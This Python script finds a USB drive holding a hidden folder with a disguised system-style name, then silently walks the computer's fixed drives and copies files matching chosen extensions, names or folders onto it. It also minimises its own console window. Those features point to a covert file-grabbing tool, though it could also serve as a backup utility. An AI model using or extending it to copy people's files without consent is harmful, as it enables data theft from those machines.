from abc import abstractmethod
from platform import system as syst
from re import compile, VERBOSE
from shutil import copyfile, copytree
from time import localtime
from sys import stdout, exit
from os import walk, chdir, listdir, sep, path, makedirs
import threading


# Note:
# find files, folders first ,, then copy them
# Contains file name in name (not exactly)

class Save_Reader:
    def __init__(self):
        self.dest, self.oser = "", ""
        self.message, self.countnumShow, self.have_log, OS_search = "", "", "", ""
        self.types, self.file, self.folders, self.exceptdrive = [], [], [], []
        self.Log, self.List_Reg_Exp = [], []
        self.counter = 5

    def Type_File_Reader(self):
        filess = listdir('.')
        if "types.txt" in filess:
            listertype, listerfile, listerfolder, exceptdrive = [], [], [], []
            file = open('types.txt')
            reader = file.readlines()

            # region Reader
            for read in reader:
                if "search_OS_drive=" in read:
                    OS_search = read.replace(" ", "").replace("\n", "").replace("search_OS_drive=", "").lower()
                if "types=" in read:
                    listertype = read.replace("types=", "").replace(" , ", '').replace("\n", "").replace(" ,",
                                                                                                         ",").replace(
                        ", ", ",").lower().split(",")

                if "files=" in read:
                    cleaning = read.replace("files=", "").replace(" , ", '').replace("\n", "").replace(" ,",
                                                                                                       ",").replace(
                        ", ", ",").lower()
                    listerfile = cleaning.split(",")

                    # if files has  ,  in their names
                    wrongSep = [i for i in listerfolder if "\"" in i or "\'" in i]
                    if any(wrongSep):
                        self.List_Reg_Exp.clear()  # clear previous items
                        self.RegularExpression(cleaning)
                        listerfile = self.List_Reg_Exp

                if "folders=" in read:
                    cleaning = read.replace("folders=", "").replace(" , ", '').replace("\n", "").replace(" ,",
                                                                                                         ",").replace(
                        ", ", ",").lower()
                    listerfolder = cleaning.split(",")

                    # if folders has  ,  in their names
                    wrongSep = [i for i in listerfolder if "\"" in i or "\'" in i]
                    if any(wrongSep):
                        self.List_Reg_Exp.clear()  # clear previous items
                        self.RegularExpression(cleaning)
                        listerfolder = self.List_Reg_Exp

                if "exceptDrive=" in read:
                    exceptdrive = read.replace("exceptDrive=", "").replace(":", "").replace(sep, "").replace(" , ",
                                                                                                             '').replace(
                        "\n", "").replace(" ,", ",").replace(", ", ",").lower().split(",")
                if "message" in read:
                    self.message = read.replace("message=", "").replace("\n", "") + "\n"
                if "countNumberShow" in read:
                    self.countnumShow = read.replace("countNumberShow=", "").replace("\n", "").lower()
                if "log=" in read:
                    self.have_log = read.replace("log=", "").replace("\n", "").lower()
            # endregion
            self.folders = list(filter(None, listerfolder))
            self.types = list(filter(None, listertype))
            self.file = list(filter(None, listerfile))
            self.exceptdrive = list(filter(None, exceptdrive))

            return OS_search
        else:
            return False

    def Type_File_Saver(self):
        filess = listdir('.')
        if "types.txt" not in filess:
            print(
                "\nThere is no [type.txt] file in this directory, copy it here and re-open the program." +
                "\nAlso you can answer these questions(hit Enter without anything typed to skip a question. " +
                "Seperate items with :  ,  )\n")
            OS_search = input("Do you want program to search in os drive/folder(s) ? (yes\\no)\n > ").replace(" ", "")
            listertype = input("Which type-file do you want to be copied ? (hit Enter for nothing)\n > ").replace(" ",
                                                                                                                  "")
            listerfile = input("What files do you want to be copied ? (hit Enter for nothing)\n > ")
            listerfolder = input("What folders do you want to be copied ? (hit Enter for nothing)\n > ")
            exceptdrive = input("What drives don't you want to be copied ? (hit Enter for nothing)\n > ").replace(" ",
                                                                                                                  "")
            message = input("What message do you want to be shown ? (hit Enter for nothing)\n > ")
            countnumShow = input("Do you want numbers of files to be counted ? (yes\\no)\n > ").replace(" ", "")
            have_log = input("Do you want to have log-file ? (yes\\no)\n > ").replace(" ", "")

            print("\nAll done. Let's go for real challenge...\n==========================\n")

            txt = open("types.txt", "w")
            txt.write("[Basic]\ntypes=" + listertype + "\nfiles=" + listerfile + "\nfolders=" + listerfolder +
                      "\nsearch_OS_drive=" + OS_search + "\n\n[Advanced]\nexceptDrive=" + exceptdrive +
                      "\nmessage=" + message + "\ncountNumberShow=" + countnumShow + "\nlog=" + have_log +
                      "\n\n\nNote:\nyou can seperate items with	                 : ,\nSearch_OS_drive,CountnumShow, " +
                      "and Log should be	 : yes\\no")
            txt.close()

        situation = self.Type_File_Reader()
        if situation:
            return True
        else:
            return False

    @staticmethod
    def Log_Saver():
        if M.have_log != "no":
            if not M.Log:
                log1 = open(M.dest + "Log.txt", "w", encoding="utf-8")
                log1.write("#####All files(folders) copied#####\n")
                log1.close()
                log = open(M.dest + "Log.txt", "a", encoding="utf-8")
                log.write(M.Structure())
                log.close()
            if len(M.Log) > 0:
                log1 = open(M.dest + "Log.txt", "w", encoding="utf-8")
                log1.write("=====Couldn't copy these files or folders=====\n\n")
                log1.close()
                log = open(M.dest + "Log.txt", "a", encoding="utf-8")
                for Log in M.Log:
                    log.write(Log + "\n")
                log.write(M.Structure())
                log.close()

    def RegularExpression(self, text):
        if text:
            text = text.replace("\'", "\"").replace("\",\"", "\"\"")

            nameRegex = compile(r'''
            \"              # first sep
            [a-zA-Z0-9.+-=_@#$%&\[\]{},;!~^ ]+   # everything between
            \"             # second sep
            ''', VERBOSE)

            searched = nameRegex.search(text)

            if searched is not None:
                OneItem = searched.group()
                self.List_Reg_Exp.append(OneItem.replace("\"", ""))

                text = text.replace(OneItem, "")

                self.RegularExpression(text)


class Main:
    def __init__(self):
        self.dest, self.oser = SRL.dest, SRL.oser
        self.message, self.countnumShow = SRL.message, SRL.countnumShow
        self.have_log = SRL.have_log
        self.types, self.file = SRL.types, SRL.file
        self.folders, self.exceptdrive = SRL.folders, SRL.exceptdrive
        self.Log, self.List_Reg_Exp = SRL.Log, SRL.List_Reg_Exp
        self.counter = SRL.counter

    @abstractmethod
    def OS_drive_search(self, OS):
        pass

    def Timer(self):
        if self.counter >= 0:
            stdout.write('\r' + str("Exiting in " + str(self.counter)))
            t = threading.Timer(1, self.Timer)
            t.start()
            self.counter -= 1

    def USB_Found_Or_Not(self, usb_list):
        if usb_list.__len__() == 0:
            print("No USB Connected!!!\n")
            self.Timer()
            exit()

    def USB_Finder_Main(self, usb_list):

        favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}"

        for usb in usb_list:
            chdir(usb)
            if favorite in listdir('.'):
                self.dest += usb + sep + favorite + sep
        if self.dest == "":
            print("No F-USB!!!\n")
            self.Timer()
            exit()

    @abstractmethod
    def Drives(self):
        pass

    def Structure(self):
        files = ["\""+i+"\"" for i in self.file]
        types = ["\""+i+"\"" for i in self.types]
        folders = ["\""+i+"\"" for i in self.folders]
        exceptdrive = ["\"" + i.upper() + "\"" for i in self.exceptdrive]


        structure = "\n==========Search==========\nSearched for these folders    : " + str(
            folders) + "\nSearched for these file-types : " + str(
            types) + "\nSearched for these files      : " + str(
            files) + "\nExcept drives                 : " + str(
            exceptdrive) + "\nAnd search os drive(folders)  : " + self.oser.replace("-os", "").lower()

        return structure.replace("\'", "").replace("[", "").replace("]", "")

    def Copier(self, driver):
        chdir(driver)

        files = self.file
        types = self.types
        folder = self.folders

        for (dirpath, dirname, filenames) in walk('.'):
            if types:
                for filename in filenames:
                    for type in types:
                        if filename.lower().endswith(types[types.index(type)]):
                            main_location = sep.join([dirpath, filename])

                            timemin = str(localtime().tm_min)
                            timesec = str(localtime().tm_sec)

                            time = " (m" + timemin + "-s" + timesec + ")"

                            absulpath = path.abspath(main_location).replace(":", "")
                            absulpath = absulpath[:absulpath.rfind(sep)] + sep

                            if filename in listdir(self.dest):
                                filename = filename.replace(types[types.index(type)], "")
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location,
                                             self.dest + absulpath + filename + time + types[types.index(type)])
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))

                            else:
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath + filename)
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))

            if files:
                for filename in filenames:
                    for file in files:
                        if files[files.index(file)] in filename.lower():
                            main_location = sep.join([dirpath, filename])

                            timemin = str(localtime().tm_min)
                            timesec = str(localtime().tm_sec)

                            time = " (m" + timemin + "-s" + timesec + ")"

                            absulpath = path.abspath(main_location).replace(":", "")
                            absulpath = absulpath[:absulpath.rfind(sep)] + sep

                            if filename in listdir(self.dest):
                                filename = filename.replace(files[files.index(file)], "")
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location,
                                             self.dest + absulpath + filename + time + files[files.index(file)])
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))

                            else:
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath + filename)
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))

            if folder:
                for dir in dirname:
                    for fold in folder:
                        if folder[folder.index(fold)] in dir.lower():
                            main_location = sep.join([dirpath, dir])

                            timemin = str(localtime().tm_min)
                            timesec = str(localtime().tm_sec)

                            time = " (m" + timemin + "-s" + timesec + ")"

                            absulpath = path.abspath(main_location).replace(":", "")
                            absulpath = absulpath[:absulpath.rfind(sep)] + sep

                            if dir in listdir(self.dest):
                                dir = dir.replace(folder[folder.index(fold)], "")
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location,
                                             self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))

                            else:
                                try:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location, self.dest + absulpath + dir)
                                except:
                                    self.Log.append(driver + main_location[2:])
                                self.counter += 1
                                if self.countnumShow != "no":
                                    stdout.write('\r' + str(self.counter))


class MainWindows(Main):
    def __init__(self, OS):
        super().__init__()

        self.dest = ""
        usb_list = self.USB_Finder()
        self.USB_Found_Or_Not(usb_list)
        self.OS_drive_search(OS)
        self.USB_Finder_Main(usb_list)
        self.Drives()

        # time
        print(" (m" + str(localtime().tm_min) + "-s" + str(localtime().tm_sec) + ")")

        self.counter = 0
        for driver in self.drive_list:
            self.Copier(driver)
        # time
        print(" (m" + str(localtime().tm_min) + "-s" + str(localtime().tm_sec) + ")")

    def OS_drive_search(self, OS_search):
        import ctypes

        self.oser = "NO-os"
        if OS_search == "yes":
            self.oser = "Yes-os"
            admin = ctypes.windll.shell32.IsUserAnAdmin()
            if admin != 1:
                print(
                    "May not work properly without Admin Permission . You can change " + '\033[1m' + "search_OS_drive " + "in types.txt to" + "\033[1m" + " no")

    @staticmethod
    def USB_Finder():
        from win32file import GetDriveType, DRIVE_REMOVABLE
        from win32api import GetLogicalDrives

        usb_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    usb_list.append(drname)

        return usb_list

    def Drives(self):
        from win32file import GetDriveType, DRIVE_FIXED
        from win32api import GetLogicalDrives
        from os import environ

        win = environ['SYSTEMDRIVE'] + sep

        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_FIXED:
                    self.drive_list.append(drname)

        # region NOT OS:
        if self.oser == "NO-os":
            for i in self.drive_list:
                if i == win:
                    self.drive_list.remove(i)
        # endregion

        # region exceptdrive
        if self.exceptdrive:
            for ex in self.exceptdrive:
                if ex.upper() + ":" + sep in self.drive_list:
                    self.drive_list.remove(ex.upper() + ":" + sep)
        # endregion

        if self.message != "":
            print(self.message)

        # region AutoMinimize
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
        # endregion


class MainLinux(Main):
    def __init__(self, OS):
        from getpass import getuser

        super().__init__()
        self.username = getuser()

        self.dest = "/media/" + self.username + sep
        usb_list = self.USB_Finder()
        self.USB_Found_Or_Not(usb_list)
        self.OS_drive_search(OS)
        self.USB_Finder_Main(usb_list)
        self.Drives()

        # time
        print(" (m" + str(localtime().tm_min) + "-s" + str(localtime().tm_sec) + ")")

        self.counter = 0
        for driver in self.drive_list:
            if driver != "/":
                if driver.replace(sep, "") in listdir("/"):
                    self.Copier(driver)
            else:
                self.Copier(driver)
        # time
        print(" (m" + str(localtime().tm_min) + "-s" + str(localtime().tm_sec) + ")")

    def OS_drive_search(self, OS_search):
        from os import getuid

        if OS_search == "yes":
            self.oser = "Yes-os"
            if getuid() != 0:
                print(
                    "====\nRun the script with root user , or change " + '\033[1m' + "search_OS_drive " +
                    "in types.txt to" + "\033[1m" + " no")
                print("====")
                self.Timer()
                exit()
            else:
                self.username = input("====\nEnter your non-root username > ").lower()
                print("====\n")
        else:
            self.oser = "NO-os"
            if getuid() == 0:
                self.username = input("====\nEnter your non-root username > ").lower()
                print("====\n")

    def USB_Finder(self):
        chdir("/media/" + self.username + "/")
        usb_list = ["/media/" + self.username + sep + usb for usb in listdir('.')]

        return usb_list

    def Drives(self):
        self.drive_list = ["/"]

        # region NOT OS:
        if self.oser == "NO-os":
            self.drive_list = ["/media", "/home", "/mnt"]
        # endregion

        # region exceptdrive
        if self.exceptdrive:
            for ex in self.exceptdrive:
                if sep + ex.lower() in self.drive_list:
                    self.drive_list.remove(sep + ex.lower())
        # endregion

        if self.message != "":
            print(self.message)

        # region AutoMinimize
        # import ctypes
        # ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
        # endregion


if __name__ == "__main__":
    if syst() == "Windows":
        SRL = Save_Reader()
        OS = SRL.Type_File_Reader() if SRL.Type_File_Reader() else SRL.Type_File_Saver()
        Main()

        M = MainWindows(OS)
        SRL.Log_Saver()

        print(".")

    if syst() == "Linux":
        SRL = Save_Reader()
        OS = SRL.Type_File_Reader() if SRL.Type_File_Reader() else SRL.Type_File_Saver()
        Main()

        M = MainLinux(OS)
        SRL.Log_Saver()

        print(".")
# print(self.folders, self.file,self.types, self.exceptdrive, self.message, self.countnumShow, self.have_log)
